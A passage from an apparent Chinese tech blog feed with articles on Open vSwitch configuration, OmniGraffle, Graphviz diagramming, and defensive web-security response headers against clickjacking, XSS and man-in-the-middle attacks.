命令行2.1 核心概念 Bridge ：网桥，对应一个以太网交换机（Switch），一个主机中可以创建一个或者多个 Bridge 设备。 Port ：Port 与物理交换机的端口概念类似, 每个 Port 都属于一个特定的 Bridge 。端口类型：Normal、Internal、Patch、Tunnel。 Interface：接口，对应网卡，即可以是 ovs 生成的虚拟网卡，也可能是挂载在 ovs 的物理网卡。在通常情况下，Port 和 Interface 是一对一的关系, 只有在配置 Port 为 bond 模式后，Port 和 Interface 是一对多的关系。 2.2 基本操作 ovs-vsctl ： 查询和更新 ovs-vswitchd 的配置； ovs-appctl ：发送命令消息，运行相关 daemon； ovsdbmonitor ： GUI工具，可以远程获取 OVS 数据库和 OpenFlow 的流表。 123456789101112# 创建一个新的交换机$ ovs-vsctl add-br ovs-switch# 创建一个端口 设置端口# 如果在创建端口的时候没有指定 OpenFlow 端口编号，会自动生成一个$ ovs-vsctl add-port ovs-switch p0 -- set Interface p0 ofport_request=100# 设置接口类型$ ovs-vsctl set Interface p0 type=internal$ ethtool -i p0# 查看交换机的端口信息$ ovs-ofctl show ovs-switch# 查看 datapath 的信息$ ovs-dpctl show 三、Open vSwitch 运行原理3.1 Open vSwitch 内部结构Open vSwitch 内部分为用户态和内核态。用户层（态）为守护程序实现了交换机和流表，是 Open vSwitch 的核心，提供了一些组件去管理交换机，实现数据库，对内核进行直接管理。主要包含三个守护进程： ovs-vswitched : 主要模块，守护进程，包括一个 Linux 内核模块。 ovsdb-server : 数据库服务,保存相关配置信息 ovs-brcompatd 数据流(flow) 通过 Open vSwitch 转发的流程。每收到一个包之后，OVS Kernel Module 将检查它是否能能命中内核模块的缓存（flow cache) ，如果命中缓存则交由 kernel 处理；如果不能命中缓存则先发送到用户空间（ovs-vswitchd process ）进行转发决策 ——— 基于一系列已经安装配置的规则库（OpenFlow rulues）；如果没有命中任何一条规则，则将包发送给 OpenFlow 控制器处理。一旦做出转发决策，这个包和转发动作将传回 OVS Kernel Module 缓存起来。这条 flow 接下来的包就将命中缓存并直接由 kernel 转发处理。 openvswitch_mod.ko 是内核态(kernel)的主要模块完成数据包的查找、转发、修改等操作，一条 flow 的后续数据包到达 OVS 后将直接交由内核态，使用 openvswitch_mod.ko 中的处理函数对数据包进行处理。 3.2 Open vSwitch 的协议支持情况 GRE-tunneled mirrors: 远程监控 LACP、VLAN、IGMP、LLDP、BFD、STP、RSTP、QoS、HFSC Complete IPv6 (Internet Protocol version 6) support Support for multiple tunneling protocols, including GRE、VXLAN 、STT、IPsec Multi-table forwarding pipeline with a flow-caching engine 3.3 Open vSwitch 的 OpenFlow 支持情况 ovs-openflowd：一个简单的 OpenFlow 交换机； ovs-controller：一个简单的 OpenFlow 控制器； ovs-ofctl 查询和控制 OpenFlow 交换机和控制器； ovs-pki ：OpenFlow 交换机创建和管理公钥框架； ovs-tcpundump：tcpdump 的补丁，解析 OpenFlow 的消息； Open vSwitch support for OpenFlow 1.1 and beyond is a work in progress.&gt;&gt;&gt; OpenFlow Support in Open vSwitch 四、Open vSwitch 性能监控 “If you can’t measure it, you can’t improve it” —— Lord Kelvin 4.1 sFlow 监控示例 启动分析器 sFlow Analyzer (以 sFlow-RT 为例) 12345678910$ cd sflow-rt$ ./start.shbash-3.2$ ./start.sh信息: Listening, sFlow port 6343信息: Listening, HTTP port 8008信息: app/ovs/scripts/status.js started警告: app/ovs/scripts/status.js app/ovs/scripts/status.js信息: app/ovs/scripts/status.js stopped$ ps -ef | grep 6343 501 30565 30431 0 2:45下午 ttys002 0:03.90 /usr/bin/java -Xms200M -Xmx200M -XX:+UseG1GC -XX:MaxGCPauseMillis=100 -Dsflow.port=6343 -Dhttp.port=8008 -jar ./lib/sflowrt.jar Connect Normal Switch to sFlow Analyzer 12345678// 指定 analyzerswitch(root)# sflow collector 10.0.0.1// 数据包采样: 1-in-4096// 常规参考值：[100 Mb/s: 1 in 500]、[1 Bb/s: 1 in 1000]、[10 Gb/s: 1 in 2000]switch(root)# sflow sampling 4096// 轮询计数器 polling counters every 20 secondsswitch(root)# sflow polling 20switch(root)# sflow enable Connect Open vSwitch to sFlow Analyzer 123// e.g. connect Open vSwitch to sFlow analyzerovs-vsctl — –id=@sflow create sflow agent=eth0 \target=\”10.0.0.1:6343\” sampling=1000 polling=20 \— set bridge br0 sflow=@sflow 4.2 Connect Open vSwitch to OpenFlow controller12// e.g. connect Open vSwitch to OpenFlow controllerovs-vsctl set-controller br0 tcp:10.0.0.1:6633 4.3 Traffic analytics : sFlow vs NetFlow sFlow does not use flow cache, so realtime charts more accurately reflect traffic trend NetFlow spikes caused by flow cache active-timeout for long running connections 应用案例 传统券商的互联网技术之路——泛前端、交易云与金融电商 NewsOpen vSwitch: Enable OpenFlow 1.5 by default | 25 Apr 2017123456789101112===================== ===== ===== ===== ===== ===== =====Open vSwitch OF1.0 OF1.1 OF1.2 OF1.3 OF1.4 OF1.5===================== ===== ===== ===== ===== ===== =====1.9 and earlier yes --- --- --- --- ---1.10, 1.11 yes --- (*) (*) --- ---2.0, 2.1 yes (*) (*) (*) --- ---2.2 yes (*) (*) (*) (%) (*)2.3, 2.4 yes yes yes yes (*) (*)2.5, 2.6, 2.7 yes yes yes yes (*) (*)2.8, 2.9, 2.10, 2.11 yes yes yes yes yes (*)2.12 yes yes yes yes yes yes===================== ===== ===== ===== ===== ===== ===== 前沿 Open vSwitch: Overview of 802.1ad (QinQ) Support Open vSwitch: QinQ Performance 扩展阅读SDN技术专题 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：SDN Controller SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Preview SDN 技术指南（七）：标准化组织 Preview SDN 技术指南（八）：案例教学 SDN技术指南（十）：在线课程推荐 网络编程专题 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 网络安全专题 Cyber-Security: IPv6 &amp; Security Cyber-Security|香港拟增设网络安全与科技罪案总警司 云计算专题 AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017 参考文献 An Introduction to OVS Architecture | YY哥 OVS 流表原理 | YY哥 kontrolissues:Installing OpenSwitch OVS初级教程：使用Open vSwitch构建虚拟网络 基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014 Offloading OVS Flow Processing using eBPF | William (Cheng-Chun) Tu VMware | OVS Conference 2016 Traffic visibility and control with sFlow | Peter Phaal InMon Corp. November 2014 Accelerating Open vSwitch to “Ludicrous Speed” | Network Heresy , 2014 Open Virtual Network (OVN) | sflow.com ,2015 Open vSwitch 2014 Fall Conference Open vSwitch 2015 Fall Conference Open vSwitch 2016 Fall Conference]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（一）思维利器 OmniGraffle for Mac 使用指南]]></title>
    <url>%2F2017%2F09%2F15%2FVisualization-OmniGraffle%2F</url>
    <content type="text"><![CDATA[摘要OmniGraffle 是由 The Omni Group 制作的一款绘图软件，它曾获得苹果设计奖。OmniGraffle 可以支持流程图、逻辑图或者网页产品模型设计等，功能非常强大。与 Graffle 对应的是在Windows平台广泛应用的 MS Visio（ Graffle 这个词据说就是为了和Visio区分而硬造出来的），关于这两个产品的用户体验对比，本文会稍有涉及。 关于它的使用细节——术的方面，建议读者直接参考帮助文档或平台上其他作者的教程。本文 重点 想探讨的，是在工程实践中的一些方法论——跟“道”有关的一些个人体会。 首发版本：《最佳工程时间——思维利器 OmniGraffle》| 简书-201601 ，本文有更新修正。 一、思维可视化一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。 常见的思维可视化模型 放射状规整（思维导图、鱼骨图）－－以后专门讨论（例如 MindManager 等） 层次化规则（架构图、组织结构图） 线性化规整（路径图、时间线） 矩阵式规则（SWOT 分析、商业模式画布） 二、数据流概要数据流可以快速梳理出数据流向，顺手还能体现数据模型的结构关系。 三、业务流第一步：确定边界开始可能不太明了，或者中途有新的变更，但是不要紧，只要搞清楚起点和终点，确定边界&amp;关键里程碑，解决从哪里来、到哪里去的终极问题，就能纲举目张画出全局流程图，之后再集中精力各个击破。 第二步：针对不同子流程各个击破 第三步：不仅仅是几个框完成第二步之后，传统语境下的流程图就完成了。但是，作为一个有追求的演员，似乎还可以尝试点什么。突然，一道灵光撞击出来新的想法。事不宜迟，马上记下来。拖几个元素，插入表格、贴上截图，简单的概要原型页就出来了。神来之笔：借用IOS风格的搜索栏，网页原型是不是颇有大写意风格。 第四步：文档归集在工程实践中，项目或产品文档的管理从来都是一个难题。从初识阶段开始，产品、设计、开发、测试、运营团队在组织架构上可能是分离的，大家本能地按自己的风格习惯写文档，即使是最重要的几个文档，也常常是Visio、PowerDesign、Word、PPT等各种格式混杂，每种文档可能还有软件版本的兼容性差异。再加上积年累月的人员更迭、团队重组，各种混乱交接，有时查一个简单的问题，都可能要打开电脑上所有的办公软件、十几个窗口。这是要疯掉的节奏，非常非常低效！基于OmniGraffle良好的兼容特性，完全可以将关键文档整合到一个Graffle文件，不但可以为当前进行的工作中保持迭代、保护成果，还能持续收拢、归纳、索引关键信息，为后续的改进优化打下好的基础。 文档树 开局索引 添加动作 跳转动作特性：切换版面、显示／隐藏图层、运行脚本 多类型分发：支持导出Pdf/PNG/HTML/Graffle模版等 导出文件动作保真：Pdf文件支持亦支持动作跳转 四、技巧1、构建组件库Graffle和Visio一样，提供了扩展资源库的支持，想要什么组件，搜一搜就有了。然而很多时候，我们面临问题不是缺少资源，而是资源太多，无法快速作出选择。正如制造工厂里的模具，码农的代码库，有逼格的人一定受不了拖个按钮都得搜索、调色半天。Graffle自带的资源、以前设计的组件、搜罗来的图片/PPT/Visio资源，日常工作中新发明的兵器，最好分门别类放到一个专门的版面。从最原始各种大小字体、点、线条、箭头开始，逐渐积累起组件，甚至样板页，不断吸收、调整、优化，愈积愈厚，直至形成自己的风格，是不是有点像逍遥派的北冥神功？当然，不排除牛人们是从一开始就可以开发出好几套不同Style的套装。 检索扩展资源库 Build Style Library 2、技术资产保护对于众多的用户来说，最大限度的复用现有数据成果，对于技术资产保护具有重要意义。包括但不限于不同工具的成果复用和转换，以及能够将存量数据迁移到 OminGraffle 非常重要。原来是 Windows 平台的用户有一个非常友好的特性，即可以在 OmniGraffle 直接打开MS Visio文件,并在此基础上继续编辑。 从MS Visio迁移 从Axure迁移 其它迁移：截图 &amp; 外部图片 3、踩过的坑 自动布局非常坑爹 自动布局的适用场景 OmniGraffle新建文件的初始设置默认是自动布局的。每当你增加一个元素，调整一下位置，command+S , 我去！！刚才的努力白费了，它会按照一套匪夷所思的对齐规则重新布局！ 除了非常简单的图形，是在想不出实际工作中有什么东西是按照经典原型排列的。好吧，我承认，因为这个坑爹的原因。我大概几个月的时间不知道怎么用这玩意，差点放弃！！虽然开始在自动布局上踩了坑，但是这招在某些情况下还是非常有用的，例如下面这个，不是美术系的怎么可能画这么圆? 还是那句话，特性很多，都有适用范围，合适就好。 拓展阅读：工作效率软件 最佳写作实践：从Evernote到Ulysses 高效创作：我的写作工具链 大道至简：我的项目管理工具集 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 精品幻灯片 | What’s New in Apple Filesystems 如何画好架构图]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Mac</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（三）基于 Graphviz 实现程序化绘图]]></title>
    <url>%2F2017%2F09%2F15%2FVisualization-Graphviz%2F</url>
    <content type="text"><![CDATA[摘要 从 OmniGraffle 自动布局说起 背景知识：图论 Graphviz 简介 最佳 Graphviz 实践(一)：流程图、数据结构图、网络路径 Trace Route 最佳 Graphviz 实践(二)：社会关系链分析（《红楼梦》、《权力的游戏》） 最佳 Graphviz 实践(三)：可视化函数调用、算法和数据结构可视化 This article is part of an Data Visualization tutorial series. Make sure to check out my other articles as well: 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（八）Program,Data and Classical Music 前言我之前的 数据可视化（一）思维利器 OmniGraffle 绘图指南 曾提到了力导图，在上文结尾还吐槽了一番自动布局按钮的坑。在本文中我力求将这个坑填上。 OmniGraffle 生成自动布局图形的基础是 Graphviz 引擎。Graphviz（Graph Visualization Software）是一个由AT&amp;T实验室启动的开源工具包，能够支持基于 DOT 脚本，文件扩展名通常是 .gv 或 .dot 的描述绘制图形。DOT 是一种文本图形描述语言，将生成的图形转换成多种输出格式的命令行工具，其输出格式包括PostScript，PDF，SVG，PNG，含注解的文本等。DOT 本身非常原始，提供了一种非常简单的描述图形的方法，同时意味着可以在命令行终端使用，或者被其它编程语言调用（Graphviz 就可以作为一个库使用）。这一点非常关键，基于 Graphviz 应用开发者不必掌握布局的复杂算法，而是可以把精力放在业务方面，将最后的图对象交给绘图引擎来处理即可。 有趣的是 Graphviz(Mac 版) 和 OmniGraffle 都曾获得苹果设计奖 Apple Design Awards。 在深入掌握 Graphviz 及其相关衍生应用之前，我们有必要了解一些基础理论 —— 图论(Graph theory)。 一、背景知识：图论(Graph theory) 柯尼斯堡七桥问题 东普鲁士柯尼斯堡（今日俄罗斯加里宁格勒）市区跨普列戈利亚河两岸，河中心有两个小岛。小岛与河的两岸有七条桥连接。在所有桥都只能走一遍的前提下，如何才能把这个地方所有的桥都走遍？ 许多数学家都尝试去寻找这类问题的解决方案，后来发展成为了数学中的图论。图论史上第一篇重要文献是莱昂哈德·欧拉在1736年发表在圣彼得堡科学院的《柯尼斯堡的七桥》。该论文证明了柯尼斯堡七桥问题中，符合条件的走法并不存在，同时提出和解决了一笔画问题。过桥问题可以抽象简化为平面上的点与线组合，每一座桥视为一条线，桥所连接的地区视为点。从这个点出发的线有奇数条称为奇点，从这个点出发的线有偶数条称为偶点。任意一种河──桥图能否全部走一次的判定法则： 如果存在两个以上（不包括两个）奇顶点，路线不存在；且有n个奇顶点的图至少需要n/2笔画出。 1、经典适用场景 路径问题（柯尼斯堡七桥问题），最小生成树问题，斯坦纳树 网络流与匹配问题：最大流问题，最小割问题，最大流最小割定理，最小费用最大流问题，二分图及任意图上的最大匹配，带权二分图的最大权匹配 覆盖问题：最大团、最大独立集、最小覆盖集、最小支配集 2、经典算法 戴克斯特拉算法(D.A) 克鲁斯卡尔算法(K.A) 普里姆算法(P.A) 拓扑排序算法(TSA) 关键路径算法(CPA) 广度优先搜索算法(BFS) 深度优先搜索算法(DFS) 二、Graphviz 简明指南1、Graphviz 布局器总的来说，Graphviz 支持两类图：无向图（graph,用“ - - ”表示节点之间）和 有向图（digraph,用“ -&gt;” 表示节点之间）。顶点和边都具有各自的属性，比如形状，颜色，填充模式，字体，样式等。主要的布局器如下： dot: 默认布局方式，主要用于有向图(directed graphs)； neato：基于 sprint model 模型，又称force-based 或者 energy minimized； twopi：径向布局(radial layouts of graphs)，放射状； circo：圆环布局(circular layout of graphs)； fdp：无向图 (undirected graphs)； sfdp: large undirected graphs patchwork 、squarified tree maps osage 、 dotty：一个用于可视化与修改图形的图形用户界面程序； lefty：一个可以显示 DOT 图形的可编程控件，并允许用户用鼠标在图上执行操作。 2、Hello World!12$ brew install graphviz$ dot -Tpng demo.dot -o demo.png 1234567891011121314151617digraph demo&#123; label=&quot;儿茶酚胺合成代谢路径&quot;; 酪氨酸 -&gt; L多巴 -&gt; 多巴胺 -&gt; 去甲肾上腺素 -&gt; 肾上腺素; 下丘脑 -&gt; 多巴胺; 交感神经元 -&gt; 去甲肾上腺素; 肾上腺髓质 -&gt; 去甲肾上腺素,肾上腺素; 酪氨酸 [label=&quot;酪氨酸&quot;,color=green]; 多巴胺 [label=&quot;多巴胺&quot;, color=red]; 肾上腺素 [label=&quot;肾上腺素&quot;, color=red]; 下丘脑 [shape=box]; 交感神经元 [shape=box]; 肾上腺髓质 [shape=box];&#125; 3、twopi 径向布局12## 缺省为 dot 布局$ dot -Kcirco -Tpng demo.dot -o demo.png 应用场景1、软件工程领域软件工程领域的主要应用： 系统分析统一建模，时序图、用例图、类图、活动图、组件图、状态图、对象图等。 可视化函数调用、包依赖关系分析 可视化数据结构 基于 Graphviz 的开源项目 PlantUML 支持快速绘制各类 UML 图形。 1234567891011121314151617181920@startumlscale 600 width[*] -&gt; State1State1 --&gt; State2 : SucceededState1 --&gt; [*] : AbortedState2 --&gt; State3 : SucceededState2 --&gt; [*] : Abortedstate State3 &#123; state &quot;Accumulate Enough Data\nLong State Name&quot; as long1 long1 : Just a test [*] --&gt; long1 long1 --&gt; long1 : New Data long1 --&gt; ProcessData : Enough Data&#125;State3 --&gt; State3 : FailedState3 --&gt; [*] : Succeeded / Save ResultState3 --&gt; [*] : Aborted@enduml Linux 内核内部结构非常复杂，从概念上就由五个主要的子系统构成：进程调度器模块、内存管理模块、虚拟文件系统、网络接口模块和进程间通信模块。这些模块之间通过函数调用和共享数据结构进行数据交互，在涉及内核版本、应用程序升级等场景中，弄清楚模块之间的依赖关系非常重要。 lsmod 命令用于显示已经加载到内核中的模块的状态信息，Used by表示依赖的内容。通过 lsmod 命令获取依赖信息之后，简单处理就可以转化为图形，而且图形生成的全过程可以由程序固化。 123456789101112131415$ lsmodModule Used byvboxdrv vboxnetadp,vboxnetflt,vboxpcinf_reject_ipv4 ipt_REJECTebtables ebtable_filterip6_tables ip6table_filterip6_udp_tunnel vxlanudp_tunnel vxlanxor btrfsraid6_pq btrfsnf_nat_masquerade_ipv4 ipt_MASQUERADExfrm_algo xfrm_usernf_defrag_ipv4 nf_conntrack_ipv4...... 123456789101112131415digraph kernel&#123; vboxdrv-&gt;vboxnetadp,vboxnetflt,vboxpci; nf_reject_ipv4-&gt;ipt_REJECT; ebtables-&gt;ebtable_filter; ip6_tables-&gt;ip6table_filter; ip6_udp_tunnel-&gt;vxlan; udp_tunnel-&gt;vxlan; xor-&gt;btrfs; raid6_pq-&gt;btrfs; nf_nat_masquerade_ipv4-&gt;ipt_MASQUERADE; xfrm_algo-&gt;xfrm_user; nf_defrag_ipv4-&gt;nf_conntrack_ipv4; ......&#125; godag: Go项目代码静态依赖分析 2、通信工程领域 nwdiag 是一个基于 Python 的、支持 Dot 脚本生成网络图的库 结合 GIS 信息追踪网络路由 123pip install nwdiagnwdiag simple.diagnwdiag -Tsvg simple.diag 12345678910111213141516nwdiag &#123; network dmz &#123; address = "210.x.x.x/24" web01 [address = "210.x.x.1"]; web02 [address = "210.x.x.2"]; &#125; network internal &#123; address = "172.x.x.x/24"; web01 [address = "172.x.x.1"]; web02 [address = "172.x.x.2"]; db01; db02; &#125;&#125; 12345678910111213141516[root@li1437-101 ~]# traceroute www.google.comtraceroute to www.google.com (216.58.216.36), 30 hops max, 60 byte packets 1 23.92.24.2 (23.92.24.2) 0.704 ms 0.736 ms 23.92.24.3 (23.92.24.3) 0.575 ms 2 173.230.159.16 (173.230.159.16) 0.910 ms 173.230.159.14 (173.230.159.14) 2.265 ms 173.230.159.0 (173.230.159.0) 0.731 ms 3 as15169.sfmix.org (206.197.187.50) 4.039 ms eqixsj-google-gige.google.com (206.223.116.21) 0.718 ms as15169.sfmix.org (206.197.187.50) 3.944 ms 4 108.170.242.227 (108.170.242.227) 4.902 ms 108.170.242.226 (108.170.242.226) 3.003 ms 108.170.243.2 (108.170.243.2) 3.064 ms 5 216.239.47.37 (216.239.47.37) 4.836 ms 64.233.174.91 (64.233.174.91) 1.476 ms 1.447 ms 6 216.239.54.22 (216.239.54.22) 12.464 ms 29.292 ms 64.233.174.204 (64.233.174.204) 9.032 ms 7 209.85.245.172 (209.85.245.172) 10.633 ms 108.170.230.130 (108.170.230.130) 20.010 ms 108.170.230.124 (108.170.230.124) 8.988 ms10 lax02s22-in-f4.1e100.net (216.58.216.36) 10.358 ms 10.383 ms 10.301 ms 12345678digraph &#123; label="Google Trace Sample"; "23.92.24.2" [label="23.92.24.2 \n Fremont,California \n location:37.5670,-121.9829"] ; as15169 [label="as15169.sfmix.org \n San Francisco \n Metropolitan Internet Exchange"]; "108.170.242.227" [label="108.170.242.227 \n California \n location:37.4192,-122.0574"]; lax02s22 [label="ax02s22-in-f4.1e100.net \n Los_Angeles,California \n location:46.07305,-100.546"]; "23.92.24.2" -&gt; as15169 -&gt; "108.170.242.227" -&gt; lax02s22;&#125; 3、社会工程领域 决策树(Decision Tree)：人群鄙视链 复杂人物关系链分析（《红楼梦》、《权力的游戏》） 注意: 如果需要使用分组（Group）特性，子图的名称必须以“cluster”开头，否则无法识别 123456789101112131415161718192021222324252627digraph family &#123; label =&quot;《红楼梦》人物关系谱·主要角色&quot;; subgraph cluster_皇族&#123; label =&quot;皇族&quot;; bgcolor=&quot;mintcream&quot;; node [ color=&quot;lightyellow&quot;, style=&quot;filled&quot;]; 北静王 [label = &quot;北静王&quot;,shape=&quot;Mrecord&quot;]; 义忠顺王 [label = &quot;义忠顺王&quot;,shape=&quot;Mrecord&quot;]; 贾元春 [label = &quot;贾元春（长女）\n 凤藻宫尚书·贤德妃&quot;,shape=&quot;Mrecord&quot;]; &#125; subgraph cluster_宁国公&#123; label =&quot;宁国公(西府)&quot;; bgcolor=&quot;mintcream&quot;; node [ color=&quot;green&quot;, style=&quot;filled&quot;]; 贾演 [label = &quot;贾演 \n 宁国公&quot;]; 贾代化[label = &quot;贾代化 \n 爵位：一等神威将军 \n 职务（武官）：京营节度使&quot;,shape=&quot;Mrecord&quot;]; 贾演 -&gt; 贾代化[label = &quot;子&quot;]; &#125;&#125; Resources Graphviz (dot) examples Introducing DataViz a data-structure visualization library for Golang memmap: Visualize Data Structures using Graphvi (Turns arbitrary data structures into more easily understood graphs.) Python blockdiag Book《Eloquent JavaScript》| Written by Marijn Haverbeke 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 Article:Grphviz and Dynagraph – Static and Dynamic Graph Drawing Tools | 2004 Emden Gansner (Google Inc.) Stephen C. North (Infovisible) Eleftherios Koutsofios (AT&amp;T) Emden Gansner (AT&amp;T Labs - Research) Graph Drawing by High-Dimensional Embedding | David Harel 《Journal of Graph Algorithms and Applications》 dotguide: Drawing graphs with dot | January 5,2015 用 Graphviz 可视化函数调用 | IBM developerworks ,2005 邱俊涛：使用graphviz绘制流程图（2015版） 周志华《机器学习》习题解答：Ch4.3 - 编程实现ID3算法 机器学习算法实践-决策树(Decision Tree) Sike:UML绘制-dot语言 类似Graphviz的工具是如何实现自动排版的？ | 知乎 你在鄙视链的哪一层？ 扒完社交网络关系才明白，《权力的游戏》凭什么是神作 | EGO影视荟]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:Web应用安全：攻击、防护与检测]]></title>
    <url>%2F2017%2F08%2F31%2FCyberSecurity-Headers%2F</url>
    <content type="text"><![CDATA[摘要 Web 应用服务器安全：攻击、防护与检测 Web 应用服务器安全：攻击、防护与检测摘要目前有许多的恶意攻击都是以网站及其用户作为目标，本文将简要介绍在 Web 服务器一侧的安全加固和测试方法。 攻击方式 防护方式 说明 点击劫持(clickjacking) X-Frame-Options Header —– 基于 SSL 的中间人攻击(SSL Man-in-the-middle) HTTP Strict Transport Security —– 跨站脚本(Cross-site scripting,XSS) X-XSS-Protection、Content-Security-Policy、X-Content-Type-Options —– 点击劫持（Clickjacking）点击劫持,clickjacking 是一种在网页中将恶意代码等隐藏在看似无害的内容（如按钮）之下，并诱使用户点击的手段，又被称为界面伪装（UI redressing）。例如用户收到一封包含一段视频的电子邮件，但其中的“播放”按钮并不会真正播放视频，而是被诱骗进入一个购物网站。 针对点击劫持攻击，开放Web应用程序安全项目(Open Web Application Security Project ,OWASP)(非营利组织，其目的是协助个人、企业和机构来发现和使用可信赖软件) 提供了一份指引，《Defending_with_X-Frame-Options_Response_Headers》 。 X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在 frame 标签 或者 object 标签中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 (clickjacking) 的攻击。DENY:表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。SAMEORIGIN:表示该页面可以在相同域名页面的 frame 中展示。ALLOW-FROM uri:表示该页面可以在指定来源的 frame 中展示。配置如下: 123456//HAProxyhttp-response set-header X-Frame-Options:DENY//Nginxadd_header X-Frame-Options "DENY";//Javaresponse.addHeader("x-frame-options","DENY"); 跨站脚本 Cross-site scripting (XSS)跨站脚本通常指的是通过利用开发时留下的漏洞，注入恶意指令代码（JavaScript/Java/VBScript/ActiveX/Flash/HTML等）到网页，使用户加载并执行攻击者恶意制造的程序。攻击者可能得到更高的权限、私密网页、会话和cookie等各种内容。目前有两种不同的 HTTP 响应头可以用来防止 XSS 攻击，它们是： X-XSS-Protection Content-Security-Policy X-XSS-ProtectionHTTP X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。配置选项：0 禁止XSS过滤。1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。mode=block 启用XSS过滤, 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。report=reporting-URI 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。参考文章《The misunderstood X-XSS-Protection》: 1234//HAProxyhttp-response set-header X-XSS-Protection: 1;mode=block//Nginxadd_header X-Xss-Protection "1; mode=block" always;; 浏览器支持情况： Chrome Edge Firefox Internet Explorer Opera Safari (Yes) (Yes) No 8.0 (Yes) (Yes) Content-Security-Policy内容安全性政策(Content Security Policy,CSP)就是一种白名单制度，明确告诉客户端哪些外部资源（脚本／图片／音视频等）可以加载和执行。浏览器可以拒绝任何不来自预定义位置的任何内容，从而防止外部注入的脚本和其他此类恶意内容。设置 Content-Security-Policy Header： 1234//HAProxy:http-response set-header Content-Security-Policy:script-src https://www.google-analytics.com;https://q.quora.com//Nginxadd_header Content-Security-Policy-Report-Only "script-src https://www.google-analytics.com https://q.quora.com"; MIME-SniffingMIME-Sniffing（主要是Internet Explorer）使用的一种技术，它尝试猜测资源的 MIME 类型（也称为 Content-Type 内容类型）。这意味着浏览器可以忽略由 Web 服务器发送的 Content-Type Header，而不是尝试分析资源（例如将纯文本标记为HTML 标签），按照它认为的资源（HTML）渲染资源而不是服务器的定义（文本）。虽然这是一个非常有用的功能，能够纠正服务器发送的错误的 Content-Type，但是心怀不轨的人可以轻易滥用这一特性，这使得浏览器和用户可能被恶意攻击。例如，如通过精心制作一个图像文件，并在其中嵌入可以被浏览器所展示和执行的HTML和t代码。《Microsoft Developer Network:IE8 Security Part V: Comprehensive Protection》： Consider, for instance, the case of a picture-sharing web service which hosts pictures uploaded by anonymous users. An attacker could upload a specially crafted JPEG file that contained script content, and then send a link to the file to unsuspecting victims. When the victims visited the server, the malicious file would be downloaded, the script would be detected, and it would run in the context of the picture-sharing site. This script could then steal the victim’s cookies, generate a phony page, etc. 1234//HAProxyhttp-response set-header X-Content-Type-Options: nosniff//Nginxadd_header X-Content-Type-Options "nosniff" always; SSL Strip Man-in-The-Middle Attack中间人攻击中攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络。强制用户使用HTTP严格传输安全（HTTP Strict Transport Security,HSTS）。 HSTS 是一套由 IETF 发布的互联网安全策略机制。Chrome 和 Firefox 浏览器有一个内置的 HSTS 的主机列表，网站可以选择使用 HSTS 策略强制浏览器使用 HTTPS 协议与网站进行通信，以减少会话劫持风险。 服务器设置下列选项可以强制所有客户端只能通过 HTTPS 连接：1234//HAProxyhttp-response set-header Strict-Transport-Security max-age=31536000;includeSubDomains;preload//Nginxadd_header Strict-Transport-Security 'max-age=31536000; includeSubDomains; preload; always;' 暴露 URL （HTTPS &gt; HTTP Sites)Referrer 信息被广泛用于网络访问流量来源分析，它是众多网站数据统计服务的基础，例如 Google Analytics 和 AWStats,基于Perl的开源日志分析工具。同样的这一特性也会很容易被恶意利用，造成用户敏感信息泄漏，例如将用户 SESSION ID 放在 URL 中，第三方拿到就可能看到别人登录后的页面内容。2014 年，W3C 发布了 Referrer 